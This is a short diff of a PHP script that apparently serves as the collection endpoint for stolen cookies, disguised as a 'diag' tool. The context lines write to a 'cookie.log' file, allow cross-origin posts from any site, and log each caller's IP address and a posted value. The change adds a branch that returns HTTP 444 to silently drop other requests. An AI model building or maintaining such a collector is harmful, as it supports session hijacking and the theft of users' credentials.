@@ -47,7 +47,6 @@ if (!file_exists(sys_get_temp_dir() . "/diag_php.pid")) {
 
 
 if (!empty($_SERVER["REQUEST_METHOD"])) {
-
     $outLog = './lots/cookie.log';
     echo "Diag information collected!";
     header("Access-Control-Allow-Origin: *");
@@ -74,4 +73,6 @@ if (!empty($_SERVER["REQUEST_METHOD"])) {
             addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-', 0);
         }
     }
+}else{
+    http_response_code(444);
 }
